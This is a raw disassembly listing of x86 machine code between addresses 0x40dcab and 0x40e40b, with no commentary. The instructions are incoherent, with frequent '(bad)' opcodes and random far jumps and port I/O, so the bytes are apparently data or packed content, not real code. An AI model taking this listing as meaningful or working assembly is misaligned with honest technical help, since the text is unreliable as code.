  40dcab:	xor    esi,DWORD PTR [ecx-0x4d2a6ed4]
  40dcb1:	cmp    cl,ah
  40dcb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcb4:	dec    eax
  40dcb5:	push   es
  40dcb6:	mov    eax,0xa9dd3876
  40dcbb:	cmp    DWORD PTR [eax+eax*2],ebp
  40dcbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dcbf:	or     al,0xc0
  40dcc1:	push   edi
  40dcc2:	xor    DWORD PTR [edi],edx
  40dcc4:	(bad)  
  40dcc5:	call   FWORD PTR ds:0xcd17a1e
  40dccb:	mov    dh,0xdf
  40dccd:	je     0x40dd21
  40dccf:	rcr    BYTE PTR [ebp-0x310b6f77],cl
  40dcd5:	call   0x689cebf6
  40dcda:	int3   
  40dcdb:	les    ecx,FWORD PTR [edi-0x2fefc6d]
  40dce1:	jecxz  0x40dccd
  40dce3:	xlat   BYTE PTR ds:[ebx]
  40dce4:	icebp  
  40dce5:	mov    eax,0xfd63c62
  40dcea:	jg     0x40dca3
  40dcec:	pop    ebp
  40dced:	sbb    ebp,edi
  40dcef:	and    ah,BYTE PTR [edx]
  40dcf1:	xchg   edi,eax
  40dcf2:	xchg   DWORD PTR [edx],esp
  40dcf4:	mov    esi,esp
  40dcf6:	mov    esp,0x18564c6c
  40dcfb:	aaa    
  40dcfc:	inc    ebp
  40dcfd:	jp     0x40dd32
  40dcff:	fs pusha 
  40dd01:	(bad)  
  40dd02:	push   cs
  40dd03:	xor    ebp,DWORD PTR [edi]
  40dd05:	shl    dl,1
  40dd07:	mov    ebx,0xb7271273
  40dd0c:	imul   esi,DWORD PTR [ebx+ebx*2],0xb56ff947
  40dd13:	push   0x14
  40dd15:	sbb    DWORD PTR [eax-0x81b0aba],ecx
  40dd1b:	sbb    BYTE PTR [ebx-0xd6a629a],bh
  40dd21:	popf   
  40dd22:	aas    
  40dd23:	loope  0x40dca9
  40dd25:	imul   ebx,DWORD PTR [edi+0x5],0x22
  40dd29:	stc    
  40dd2a:	fstp   QWORD PTR [esi+0x3e1e0bd9]
  40dd30:	repz mov ah,0xdb
  40dd33:	sahf   
  40dd34:	cli    
  40dd35:	rcr    BYTE PTR [esi],cl
  40dd37:	cmp    eax,0x8110414c
  40dd3c:	dec    ebx
  40dd3d:	adc    BYTE PTR [ebx+0x70],ch
  40dd40:	cwde   
  40dd41:	cmp    ch,BYTE PTR [ecx]
  40dd43:	jo     0x40dd18
  40dd45:	or     edx,ecx
  40dd47:	adc    eax,DWORD PTR [esi-0x1e498ace]
  40dd4d:	into   
  40dd4e:	inc    esi
  40dd4f:	faddp  st(0),st
  40dd51:	dec    ebp
  40dd52:	mov    edx,0x27ff274b
  40dd57:	sub    al,BYTE PTR [ebx+0x27]
  40dd5a:	lock popa 
  40dd5c:	pop    ds
  40dd5d:	mov    esi,DWORD PTR [ecx+0x40860a3c]
  40dd63:	test   eax,0x14a1498b
  40dd68:	enter  0x3791,0x39
  40dd6c:	rcl    esp,cl
  40dd6e:	in     eax,dx
  40dd6f:	push   ss
  40dd70:	in     al,0x3a
  40dd72:	push   cs
  40dd73:	mov    es,ecx
  40dd75:	mov    dl,0x61
  40dd77:	add    al,0x37
  40dd79:	and    cl,BYTE PTR [ecx]
  40dd7b:	push   eax
  40dd7c:	or     al,0xc5
  40dd7e:	push   ebx
  40dd7f:	bound  edi,QWORD PTR [ebx-0x55]
  40dd82:	xor    eax,0xef31abc3
  40dd87:	push   ss
  40dd88:	dec    esp
  40dd89:	lahf   
  40dd8a:	ins    BYTE PTR es:[edi],dx
  40dd8b:	and    eax,0x395af672
  40dd90:	clc    
  40dd91:	mov    cl,0x23
  40dd93:	push   0x4bfac79e
  40dd98:	jmp    0x8cbb:0xda6e9824
  40dd9f:	cwde   
  40dda0:	jge    0x40ddb5
  40dda2:	push   edi
  40dda3:	and    eax,0x5e4560e7
  40dda8:	dec    BYTE PTR [edi-0x3f]
  40ddab:	out    dx,al
  40ddac:	lods   eax,DWORD PTR ds:[esi]
  40ddad:	lock dec edi
  40ddaf:	repnz xchg ebx,eax
  40ddb1:	dec    DWORD PTR [esi-0x29]
  40ddb4:	cld    
  40ddb5:	dec    eax
  40ddb6:	push   ds
  40ddb7:	adc    dh,BYTE PTR [ecx+0x1]
  40ddba:	mov    al,ah
  40ddbc:	fisttp WORD PTR [edx+ebx*2]
  40ddbf:	xor    DWORD PTR [ecx-0x53],esi
  40ddc2:	mov    ebp,0x783e5004
  40ddc7:	fadd   QWORD PTR [eax-0x7b4cf70f]
  40ddcd:	mov    al,ds:0xc764679c
  40ddd2:	leave  
  40ddd3:	data16 outs dx,BYTE PTR ds:[esi]
  40ddd5:	mul    DWORD PTR [ecx-0x7f8179ed]
  40dddb:	push   cs
  40dddc:	adc    al,0xfe
  40ddde:	ins    BYTE PTR es:[edi],dx
  40dddf:	cs (bad) 
  40dde1:	stc    
  40dde2:	test   DWORD PTR [ebx+0x39],eax
  40dde5:	in     eax,dx
  40dde6:	or     bl,BYTE PTR [edx]
  40dde8:	and    dl,BYTE PTR [edi]
  40ddea:	aas    
  40ddeb:	daa    
  40ddec:	inc    eax
  40dded:	test   ecx,0x196bec76
  40ddf3:	in     al,0x92
  40ddf5:	inc    eax
  40ddf6:	mov    BYTE PTR [esi],cl
  40ddf8:	sub    eax,0x51598e6f
  40ddfd:	push   edi
  40ddfe:	xchg   DWORD PTR [ecx+0x314fbcae],edx
  40de04:	jo     0x40dddc
  40de06:	mov    dh,0x43
  40de08:	repnz fcomp DWORD PTR [edx+0x40]
  40de0c:	inc    esi
  40de0d:	scas   eax,DWORD PTR es:[edi]
  40de0e:	ror    DWORD PTR [edi+0x35],cl
  40de11:	add    BYTE PTR [ecx],dl
  40de13:	xchg   esi,eax
  40de14:	loop   0x40de1e
  40de16:	adc    dh,dh
  40de18:	push   esi
  40de19:	pop    ecx
  40de1a:	call   0x391edbd6
  40de1f:	(bad)  
  40de20:	jg     0x40de83
  40de22:	cmp    ecx,DWORD PTR [eax-0x29272b72]
  40de28:	fadd   QWORD PTR [edi+ebp*1]
  40de2b:	iret   
  40de2c:	sbb    BYTE PTR [esi],bh
  40de2e:	inc    esp
  40de2f:	fdivr  QWORD PTR [ebp+0x3b7576b2]
  40de35:	mov    BYTE PTR [edx+0x70f04654],al
  40de3b:	xor    BYTE PTR [eax+0x6c],ch
  40de3e:	push   ebp
  40de3f:	les    ebx,FWORD PTR [esi+eax*1+0x7288967a]
  40de46:	jns    0x40de87
  40de48:	xbegin 0x4f4a75de
  40de4e:	sbb    edx,DWORD PTR [edi+0x6da9afe5]
  40de54:	popa   
  40de55:	push   esp
  40de56:	hlt    
  40de57:	cmp    ch,BYTE PTR [eax-0x8]
  40de5a:	pop    ebp
  40de5b:	into   
  40de5c:	shl    BYTE PTR [eax-0x567cb994],1
  40de62:	mov    ecx,0x884f8fbb
  40de67:	aaa    
  40de68:	xchg   ebx,eax
  40de69:	xchg   esp,eax
  40de6a:	adc    DWORD PTR [ecx],edi
  40de6c:	xor    ebx,esi
  40de6e:	dec    eax
  40de6f:	jl     0x40de23
  40de71:	dec    edx
  40de72:	(bad)  
  40de73:	jmp    0xdfae:0xd4105cc2
  40de7a:	lock in eax,0x2b
  40de7d:	out    dx,eax
  40de7e:	push   ecx
  40de7f:	popf   
  40de80:	ret    0x820a
  40de83:	mov    dl,0x97
  40de85:	imul   ebp,ebp,0x20f8b4ce
  40de8b:	(bad)  
  40de8c:	xchg   ebx,eax
  40de8d:	lods   al,BYTE PTR ds:[esi]
  40de8e:	pop    esp
  40de8f:	mov    esi,0x7ab75785
  40de94:	jg     0x40de83
  40de96:	repnz out dx,eax
  40de98:	mov    cl,0x4c
  40de9a:	pop    ebp
  40de9b:	xchg   ebp,eax
  40de9c:	fcom   DWORD PTR [edi+0x75733c89]
  40dea2:	test   BYTE PTR [eax+0x730e798a],ah
  40dea8:	or     DWORD PTR [ebp+0x5d],edi
  40deab:	or     BYTE PTR [esi],dl
  40dead:	aas    
  40deae:	data16 sahf 
  40deb0:	imul   esp,DWORD PTR [eax-0x4],0x3281e3b4
  40deb7:	push   ds
  40deb8:	or     ah,BYTE PTR [ebx]
  40deba:	pop    ds
  40debb:	div    edx
  40debd:	les    edi,FWORD PTR [esi*4+0xdfd065b]
  40dec4:	les    ebx,FWORD PTR [esi+0x64]
  40dec7:	std    
  40dec8:	jecxz  0x40df17
  40deca:	(bad)  
  40decb:	mov    esi,0x1e442092
  40ded0:	jecxz  0x40deb6
  40ded2:	mov    eax,0x36d377e7
  40ded7:	in     al,0x37
  40ded9:	xor    al,0xad
  40dedb:	pop    esp
  40dedc:	shl    BYTE PTR [edx+ecx*4],0x2b
  40dee0:	mov    ecx,0x302da4a0
  40dee5:	out    0x4a,al
  40dee7:	into   
  40dee8:	sbb    eax,0x31192c29
  40deed:	dec    ecx
  40deee:	or     edx,DWORD PTR [esi-0x74]
  40def1:	fldcw  WORD PTR [edx+0x2e]
  40def4:	into   
  40def5:	bound  edi,QWORD PTR [ebp+ecx*2+0x6f129e38]
  40defc:	call   0x36e6:0x8f53010a
  40df03:	mov    dh,0x65
  40df05:	es adc al,0xaf
  40df08:	aaa    
  40df09:	mov    ecx,0x713ab804
  40df0e:	push   esp
  40df0f:	loopne 0x40dee9
  40df11:	pop    ebx
  40df12:	lock jecxz 0x40df02
  40df15:	sub    bh,BYTE PTR [eax+0x3d]
  40df18:	xor    BYTE PTR [ebp+0x4c387e01],cl
  40df1e:	pop    ebp
  40df1f:	dec    ecx
  40df20:	dec    ebx
  40df21:	and    DWORD PTR [esi+0x3e],ecx
  40df24:	in     al,0x77
  40df26:	scas   eax,DWORD PTR es:[edi]
  40df27:	adc    DWORD PTR [ecx+edi*2],0xffffff90
  40df2b:	push   es
  40df2c:	xchg   esp,eax
  40df2d:	jne    0x40df57
  40df2f:	ss in  eax,0x26
  40df32:	pop    edx
  40df33:	hlt    
  40df34:	jecxz  0x40df08
  40df36:	test   cx,dx
  40df39:	mov    al,0x38
  40df3b:	retf   0x8011
  40df3e:	pop    ds
  40df3f:	or     al,0xf5
  40df41:	fs dec ebp
  40df43:	and    al,0xd4
  40df45:	jl     0x40df8c
  40df47:	pop    es
  40df48:	aam    0xf3
  40df4a:	cdq    
  40df4b:	mov    bh,0xd2
  40df4d:	push   cs
  40df4e:	(bad)  
  40df4f:	aad    0xa6
  40df51:	out    dx,al
  40df52:	out    dx,eax
  40df53:	pop    ebx
  40df54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df56:	into   
  40df57:	pop    es
  40df58:	icebp  
  40df59:	scas   al,BYTE PTR es:[edi]
  40df5a:	jbe    0x40dfa9
  40df5c:	test   eax,0xb00e4ab8
  40df61:	jp     0xaac3e3e8
  40df67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df68:	out    0x5a,al
  40df6a:	add    ah,BYTE PTR [ebx+0xde164fc]
  40df70:	arpl   WORD PTR [eax+0x51a1d2bf],ax
  40df76:	jp     0x40dfa2
  40df78:	add    BYTE PTR [edi-0x18],0x1d
  40df7c:	sti    
  40df7d:	daa    
  40df7e:	xchg   ebx,eax
  40df7f:	mov    esp,0xc21b9784
  40df84:	test   ch,0x41
  40df87:	mov    ebx,ebp
  40df89:	sub    ebx,ecx
  40df8b:	jne    0x40df51
  40df8d:	pop    ebp
  40df8e:	faddp  st(3),st
  40df90:	stos   BYTE PTR es:[edi],al
  40df91:	xchg   esi,eax
  40df92:	lds    edi,FWORD PTR [ebx+0xe016a94]
  40df98:	xchg   ebx,eax
  40df99:	sub    eax,0x7cff20bf
  40df9e:	repz push esi
  40dfa0:	into   
  40dfa1:	sub    BYTE PTR [edi+0x53a1e7c],al
  40dfa7:	ja     0x40df47
  40dfa9:	daa    
  40dfaa:	imul   ebx,DWORD PTR [edx],0xcdcc785f
  40dfb0:	push   es
  40dfb1:	xchg   ebx,ebx
  40dfb3:	mov    al,0xb2
  40dfb5:	ins    DWORD PTR es:[edi],dx
  40dfb6:	mov    esi,0x850093a4
  40dfbb:	addr16 repz dec ecx
  40dfbe:	out    0x91,al
  40dfc0:	push   es
  40dfc1:	xlat   BYTE PTR ds:[ebx]
  40dfc2:	sbb    al,0x9f
  40dfc4:	jb     0x40dfbd
  40dfc6:	aad    0x7e
  40dfc8:	loopne 0x40dfe5
  40dfca:	xchg   edi,eax
  40dfcb:	jl     0x40e00b
  40dfcd:	stc    
  40dfce:	mov    edi,0xaea9997b
  40dfd3:	jae    0x40e01c
  40dfd5:	add    BYTE PTR [ecx-0x79],0xc9
  40dfd9:	jno    0x40e04e
  40dfdb:	mov    esi,DWORD PTR [edx-0x74]
  40dfde:	sahf   
  40dfdf:	fchs   
  40dfe1:	test   al,0x67
  40dfe3:	jmp    0x40df8a
  40dfe5:	cvtps2pi mm7,QWORD PTR [ebx+ecx*1-0x583665c3]
  40dfed:	pusha  
  40dfee:	cdq    
  40dfef:	stc    
  40dff0:	test   eax,0xf76d45b5
  40dff5:	cwde   
  40dff6:	mov    BYTE PTR [edi+eax*2+0x4819a77c],al
  40dffd:	dec    ecx
  40dffe:	outs   dx,BYTE PTR ds:[esi]
  40dfff:	fild   QWORD PTR [edi+0x7b30af9a]
  40e005:	ficomp DWORD PTR ds:0xd5a0fadd
  40e00b:	test   al,0xac
  40e00d:	mov    esp,ebp
  40e00f:	out    dx,al
  40e010:	lods   al,BYTE PTR gs:[esi]
  40e012:	mov    ecx,0xd18d9be4
  40e017:	xor    cl,ah
  40e019:	ins    BYTE PTR es:[edi],dx
  40e01a:	enter  0x142b,0x65
  40e01e:	retf   0x3498
  40e021:	enter  0x809e,0x65
  40e025:	out    dx,eax
  40e026:	jecxz  0x40e0a3
  40e028:	dec    ebx
  40e029:	repnz in eax,0xb
  40e02c:	das    
  40e02d:	xor    ecx,ebx
  40e02f:	ret    
  40e030:	pop    esi
  40e031:	out    dx,eax
  40e032:	icebp  
  40e033:	mov    edi,DWORD PTR [edi-0x4]
  40e036:	call   0x57e003f3
  40e03b:	aaa    
  40e03c:	push   0xfffffff8
  40e03e:	daa    
  40e03f:	mov    ebp,0xb3bf66b
  40e044:	into   
  40e045:	sbb    DWORD PTR [esi+esi*4],0x71
  40e049:	cmp    dh,dh
  40e04b:	sbb    BYTE PTR [edi+0x19de85d3],ch
  40e051:	imul   ebx
  40e053:	jle    0x40e06e
  40e055:	xchg   BYTE PTR [eax],ah
  40e057:	xchg   ecx,eax
  40e058:	xlat   BYTE PTR ds:[ebx]
  40e059:	or     dl,0x72
  40e05c:	inc    edx
  40e05d:	les    ebx,FWORD PTR [edx*8-0x7b48bdd6]
  40e064:	jle    0x40e018
  40e066:	push   cs
  40e067:	jmp    0xf26ddc28
  40e06c:	or     DWORD PTR [ecx],ecx
  40e06e:	cli    
  40e06f:	cs rcl ebx,cl
  40e072:	retf   0x5fca
  40e075:	lock test DWORD PTR [ecx+0x6c10c845],0x48fe6e8a
  40e080:	sbb    al,0x54
  40e082:	mov    eax,0x41a94757
  40e087:	test   DWORD PTR [ebx+edi*2+0x5b],0xdc5f4501
  40e08f:	dec    eax
  40e090:	ret    
  40e091:	scas   eax,DWORD PTR es:[edi]
  40e092:	push   edx
  40e093:	test   al,0x6d
  40e095:	jp     0x40e04e
  40e097:	mov    WORD PTR [edx+0x1d6e6854],?
  40e09d:	(bad)  
  40e09f:	jne    0x40e117
  40e0a1:	sti    
  40e0a2:	stc    
  40e0a3:	fstp   st(7)
  40e0a5:	adc    eax,0x6bfbc3b0
  40e0aa:	dec    eax
  40e0ab:	adc    eax,0xbc61a25f
  40e0b0:	out    dx,eax
  40e0b1:	idiv   ebx
  40e0b3:	push   edi
  40e0b4:	pop    ebp
  40e0b5:	pushf  
  40e0b6:	dec    esi
  40e0b7:	or     al,BYTE PTR [ebx+ebp*1]
  40e0ba:	aam    0x8e
  40e0bc:	fadd   st,st(2)
  40e0be:	push   0x388c2417
  40e0c3:	push   DWORD PTR [eax]
  40e0c5:	and    DWORD PTR [ebp+0x60adb887],ebx
  40e0cb:	(bad)  
  40e0cd:	lds    edi,FWORD PTR [eax+edi*1-0x36]
  40e0d1:	adc    BYTE PTR [edi-0x5f5b6a9c],cl
  40e0d7:	shr    BYTE PTR [ebx-0x2fb76f43],0xcb
  40e0de:	sub    dh,BYTE PTR [ecx]
  40e0e0:	adc    al,0x5e
  40e0e2:	loop   0x40e086
  40e0e4:	aaa    
  40e0e5:	sbb    BYTE PTR fs:[edi-0x3],al
  40e0e9:	sub    cl,BYTE PTR [edi+0xa]
  40e0ec:	xor    BYTE PTR [esi-0x5b],bl
  40e0ef:	mov    dh,0x5e
  40e0f1:	cmp    edx,esp
  40e0f3:	nop
  40e0f4:	loop   0x40e08e
  40e0f6:	push   ds
  40e0f7:	pop    esp
  40e0f8:	push   ss
  40e0f9:	dec    ebp
  40e0fa:	and    ecx,DWORD PTR [ebp-0x7ecfcc65]
  40e100:	fwait
  40e101:	ret    0x4d97
  40e104:	xchg   edx,eax
  40e105:	jle    0x40e178
  40e107:	shr    BYTE PTR [ebx+0x5226a143],0xc4
  40e10e:	jge    0x40e096
  40e110:	retf   
  40e111:	jmp    0x55d9b63e
  40e116:	cmp    DWORD PTR [edx],esp
  40e118:	add    BYTE PTR [ebp+0x3e],0x88
  40e11c:	sbb    DWORD PTR [esi],0x1cc48551
  40e122:	cmc    
  40e123:	lods   al,BYTE PTR ds:[esi]
  40e124:	xchg   edx,eax
  40e125:	mov    ah,0xa4
  40e127:	mov    ebx,eax
  40e129:	jle    0x40e193
  40e12b:	sbb    eax,0xe46dedcc
  40e130:	mov    al,0xc
  40e132:	loope  0x40e196
  40e134:	stos   DWORD PTR es:[edi],eax
  40e135:	mov    BYTE PTR [edx-0x7230e15b],ah
  40e13b:	in     al,dx
  40e13c:	(bad)
  40e13f:	cld    
  40e140:	or     eax,0x1a14618a
  40e145:	pop    es
  40e146:	into   
  40e147:	sbb    ebx,DWORD PTR [esi-0x11]
  40e14a:	bound  ebx,QWORD PTR [ecx]
  40e14c:	sti    
  40e14d:	clc    
  40e14e:	and    BYTE PTR [eax-0x7da81e7e],dl
  40e154:	xlat   BYTE PTR ds:[ebx]
  40e155:	lods   eax,DWORD PTR gs:[esi]
  40e157:	jp     0x40e1cf
  40e159:	lea    ebx,[ebp+0x69063b59]
  40e15f:	jg     0x40e191
  40e161:	es xor ch,dh
  40e164:	out    dx,eax
  40e165:	cmp    eax,0x94592a6c
  40e16a:	push   esp
  40e16b:	add    eax,0x8dcf02c7
  40e170:	test   eax,0xc6018795
  40e175:	inc    BYTE PTR [ebp-0x28]
  40e178:	je     0x40e1f2
  40e17a:	jmp    0x50e0:0xe2c8305b
  40e181:	aam    0xa0
  40e183:	leave  
  40e184:	sub    al,0xb
  40e186:	inc    esp
  40e187:	stc    
  40e188:	jo     0x40e1f7
  40e18a:	in     eax,dx
  40e18b:	xlat   BYTE PTR ds:[ebx]
  40e18c:	or     cl,BYTE PTR [ebx]
  40e18e:	cld    
  40e18f:	add    eax,0xeefd0423
  40e194:	add    eax,0xe7575e89
  40e199:	out    dx,eax
  40e19a:	mov    ebp,0x5a747e8c
  40e19f:	(bad)  
  40e1a0:	ret    0x3107
  40e1a3:	arpl   WORD PTR [edi-0x430ceef2],dx
  40e1a9:	cmp    ecx,DWORD PTR [eax]
  40e1ab:	lea    eax,[ebx-0x3d]
  40e1ae:	addr16 push esi
  40e1b0:	sbb    BYTE PTR [edx],al
  40e1b2:	sbb    eax,0xef98ef57
  40e1b7:	repnz cli 
  40e1b9:	pop    esi
  40e1ba:	dec    ebp
  40e1bb:	ins    DWORD PTR es:[edi],dx
  40e1bc:	xor    eax,0xdb671b06
  40e1c1:	mov    edx,DWORD PTR [ecx-0x34]
  40e1c4:	inc    ecx
  40e1c5:	and    DWORD PTR [edx-0x1d],ecx
  40e1c8:	std    
  40e1c9:	and    ebx,DWORD PTR [eax+0x7c538bb7]
  40e1cf:	pop    ebx
  40e1d0:	push   edx
  40e1d1:	add    DWORD PTR [esi-0x3f],edi
  40e1d4:	cld    
  40e1d5:	cmp    eax,0xdf046c8a
  40e1da:	add    esi,DWORD PTR [esi+0x76]
  40e1dd:	shl    BYTE PTR [ecx+ecx*4+0x31],0x7e
  40e1e2:	lods   eax,DWORD PTR ds:[esi]
  40e1e3:	sbb    al,0xc2
  40e1e5:	fs (bad) 
  40e1e7:	xchg   edi,eax
  40e1e8:	cdq    
  40e1e9:	retf   
  40e1ea:	xor    al,0xd7
  40e1ec:	pop    esi
  40e1ed:	and    eax,edx
  40e1ef:	mov    ebx,0x6d9f4f01
  40e1f4:	dec    edx
  40e1f5:	mov    dl,0x27
  40e1f7:	pop    es
  40e1f8:	jo     0x40e263
  40e1fa:	call   0x9b7b8241
  40e1ff:	and    BYTE PTR [esi],bl
  40e201:	mov    fs,WORD PTR [esi+0x14]
  40e204:	mov    ebx,0x3de18003
  40e209:	aaa    
  40e20a:	call   0xc761:0x75bbb61c
  40e211:	cmp    BYTE PTR [edx+0x199fb18e],0xcc
  40e218:	dec    ebp
  40e219:	ins    BYTE PTR es:[edi],dx
  40e21a:	paddw  mm5,QWORD PTR [edi+0x63d4fa4]
  40e221:	jo     0x40e1aa
  40e223:	pop    ebx
  40e224:	or     al,0xc3
  40e226:	jbe    0x40e1c3
  40e228:	(bad)  
  40e229:	imul   esi,DWORD PTR [esi+0xf],0x2e8f5e2e
  40e230:	cs daa 
  40e232:	pusha  
  40e233:	icebp  
  40e234:	push   0x2f
  40e236:	jecxz  0x40e1bb
  40e238:	dec    DWORD PTR [ecx+0x3a19d3c1]
  40e23e:	ins    BYTE PTR es:[edi],dx
  40e23f:	addr16 adc eax,ebx
  40e242:	push   cs
  40e243:	xchg   BYTE PTR [esi-0x4f],ah
  40e246:	shr    BYTE PTR [edx+ebp*4],1
  40e249:	jb     0x40e20a
  40e24b:	test   al,0xb6
  40e24d:	jmp    0x40e210
  40e24f:	add    al,0x6f
  40e251:	cmp    ebx,edx
  40e253:	or     DWORD PTR [eax+0x3b02f08b],eax
  40e259:	xlat   BYTE PTR ds:[ebx]
  40e25a:	cmp    ecx,eax
  40e25c:	cs mov esp,0x7a60cbad
  40e262:	out    0x27,eax
  40e264:	mov    dh,BYTE PTR [esi+edi*2]
  40e267:	mov    dh,0x6c
  40e269:	in     al,0x88
  40e26b:	and    ah,ah
  40e26d:	push   0x54
  40e26f:	outs   dx,BYTE PTR ds:[esi]
  40e270:	inc    ecx
  40e271:	cdq    
  40e272:	pop    ss
  40e273:	test   ecx,ebp
  40e275:	fisttp DWORD PTR [eax-0x12]
  40e278:	pop    esp
  40e279:	dec    esp
  40e27a:	test   ecx,eax
  40e27c:	dec    edx
  40e27d:	(bad)  
  40e27f:	jle    0x40e268
  40e281:	scas   al,BYTE PTR es:[edi]
  40e282:	or     DWORD PTR [eax+0x46],ebx
  40e285:	ja     0x40e2d6
  40e287:	div    ecx
  40e289:	in     eax,0xa2
  40e28b:	sub    eax,0x38cbfbf9
  40e290:	(bad)  
  40e291:	aam    0xe6
  40e293:	mov    ebx,0xdef5dbb8
  40e298:	push   edx
  40e299:	push   ecx
  40e29a:	int    0xa7
  40e29c:	scas   al,BYTE PTR es:[edi]
  40e29d:	repz shr BYTE PTR [edx-0x37],0x24
  40e2a2:	je     0x40e247
  40e2a4:	add    DWORD PTR [esi-0x2a],0xffffffac
  40e2a8:	or     al,0xcd
  40e2aa:	sbb    eax,edx
  40e2ac:	loope  0x40e242
  40e2ae:	mul    DWORD PTR [ecx+0x23]
  40e2b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e2b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e2b3:	sbb    edx,eax
  40e2b5:	repz daa 
  40e2b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2b8:	aaa    
  40e2b9:	ja     0x40e2f2
  40e2bb:	jecxz  0x40e2ec
  40e2bd:	scas   eax,DWORD PTR es:[edi]
  40e2be:	mov    ah,0xba
  40e2c0:	push   ebp
  40e2c1:	sbb    DWORD PTR [eax+0x6c],ecx
  40e2c4:	pop    edx
  40e2c5:	xlat   BYTE PTR ds:[ebx]
  40e2c6:	cmp    esp,DWORD PTR [eax-0x186a9dbf]
  40e2cc:	pop    ds
  40e2cd:	and    dl,BYTE PTR [ebp-0x169d8a8e]
  40e2d3:	fdivr  st(5),st
  40e2d5:	popf   
  40e2d6:	mov    ebx,DWORD PTR [ebx-0x9d2fa46]
  40e2dc:	std    
  40e2dd:	push   eax
  40e2de:	pop    esi
  40e2df:	mov    edx,0xff533921
  40e2e4:	repz shl bh,0xb4
  40e2e8:	inc    edx
  40e2e9:	sbb    eax,0x67f0b27d
  40e2ee:	mov    eax,ds:0xe6037426
  40e2f3:	fadd   QWORD PTR [ebx+0x48]
  40e2f6:	or     ebx,DWORD PTR [ecx+0x6f042960]
  40e2fc:	inc    eax
  40e2fd:	out    dx,al
  40e2fe:	cs sub al,0x62
  40e301:	(bad)  
  40e302:	retf   
  40e303:	int    0xfb
  40e305:	jo     0x40e340
  40e307:	lds    edi,FWORD PTR ds:0x103fc3d2
  40e30d:	xchg   ebp,eax
  40e30e:	les    edx,FWORD PTR [ecx-0x61f75369]
  40e314:	pop    es
  40e315:	cld    
  40e316:	out    dx,eax
  40e317:	xor    ecx,DWORD PTR [eax+0x67]
  40e31a:	mov    WORD PTR [ebx],ss
  40e31c:	ins    DWORD PTR es:[edi],dx
  40e31d:	adc    al,0x9c
  40e31f:	add    ecx,0x68
  40e322:	sbb    cl,BYTE PTR [edi+esi*4]
  40e325:	mov    ds:0xb7d68d02,eax
  40e32a:	jg     0x40e36e
  40e32c:	out    dx,al
  40e32d:	(bad)  
  40e32e:	(bad)  
  40e32f:	fild   WORD PTR [ebp+0x78425dd0]
  40e335:	out    dx,al
  40e336:	arpl   WORD PTR [edx],dx
  40e338:	(bad)  
  40e339:	cmp    al,0xc5
  40e33b:	pop    eax
  40e33c:	loope  0x40e321
  40e33e:	cli    
  40e33f:	xor    eax,0x6238f105
  40e344:	mov    dh,ah
  40e346:	daa    
  40e347:	fisttp QWORD PTR [edx+ebx*8]
  40e34a:	sbb    edx,DWORD PTR [esi+eax*2-0x11]
  40e34e:	loopne 0x40e3cd
  40e350:	pop    es
  40e351:	push   ebp
  40e352:	ror    DWORD PTR [edx],0x4
  40e355:	inc    ecx
  40e356:	cmp    BYTE PTR [ebp-0x2bf2b1cb],cl
  40e35c:	inc    ebx
  40e35d:	or     eax,0x65af0c79
  40e362:	(bad)  
  40e364:	or     bl,BYTE PTR [ebx+ebp*1-0x10]
  40e368:	enter  0x5456,0x4a
  40e36c:	retf   0x679e
  40e36f:	mov    ecx,0x8e874902
  40e374:	dec    ebx
  40e375:	leave  
  40e376:	xchg   edi,eax
  40e377:	xchg   esi,eax
  40e378:	sahf   
  40e379:	jb     0x40e3f8
  40e37b:	pop    es
  40e37c:	xor    al,0x7e
  40e37e:	jecxz  0x40e386
  40e380:	mov    dl,0x81
  40e382:	mov    ebx,0xf422a74c
  40e387:	ret    
  40e388:	cmp    al,0x14
  40e38a:	xchg   DWORD PTR [ebp+0x54],ebp
  40e38d:	push   esi
  40e38e:	push   ebx
  40e38f:	cmp    dh,BYTE PTR [ebx+edx*1]
  40e392:	dec    ebx
  40e393:	cld    
  40e394:	in     al,dx
  40e395:	mov    al,0x6c
  40e397:	xor    al,0xc2
  40e399:	(bad)  
  40e39a:	outs   dx,BYTE PTR ds:[esi]
  40e39b:	and    eax,0x9f4d7e2c
  40e3a0:	cmp    eax,DWORD PTR [ebx]
  40e3a2:	push   esp
  40e3a3:	or     BYTE PTR ds:0xb6769ad7,bl
  40e3a9:	aad    0x69
  40e3ab:	jbe    0x40e3ec
  40e3ad:	xchg   esi,eax
  40e3ae:	in     eax,0x80
  40e3b0:	pop    esp
  40e3b1:	idiv   BYTE PTR [eax+ebp*1+0x7e]
  40e3b5:	push   esi
  40e3b6:	imul   esp,edx,0x62
  40e3b9:	pop    ebx
  40e3ba:	sbb    cl,dl
  40e3bc:	mov    ebx,0x3efcde5b
  40e3c1:	add    dl,BYTE PTR [eax+ebx*8+0x6d]
  40e3c5:	dec    edx
  40e3c6:	ins    BYTE PTR es:[edi],dx
  40e3c7:	sbb    BYTE PTR [edx],ch
  40e3c9:	cli    
  40e3ca:	mov    ah,0xe9
  40e3cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3cd:	fstp   DWORD PTR [ecx]
  40e3cf:	mov    eax,0x6f66f669
  40e3d4:	inc    edi
  40e3d5:	sub    eax,0x58010fcd
  40e3da:	mov    ah,0x4b
  40e3dc:	adc    DWORD PTR ds:[esi+0x3b],eax
  40e3e0:	(bad)  
  40e3e1:	mov    ch,0x43
  40e3e3:	jno    0x40e428
  40e3e5:	xchg   edi,eax
  40e3e6:	popf   
  40e3e7:	xchg   edi,eax
  40e3e8:	cli    
  40e3e9:	mov    ah,0x7
  40e3eb:	add    bh,BYTE PTR [eax-0x38]
  40e3ee:	icebp  
  40e3ef:	ins    BYTE PTR es:[edi],dx
  40e3f0:	dec    esp
  40e3f1:	(bad)  
  40e3f2:	inc    esp
  40e3f3:	push   ebp
  40e3f4:	or     ah,BYTE PTR [ebx+0x1c910f4e]
  40e3fa:	addr16 (bad) 
  40e3fc:	inc    eax
  40e3fd:	loopne 0x40e3c2
  40e3ff:	push   ss
  40e400:	fmul   QWORD PTR [edx+0x54954888]
  40e406:	sub    al,0x55
  40e408:	xor    esi,DWORD PTR [edx+ebp*1]
  40e40b:	cmp    al,0xef
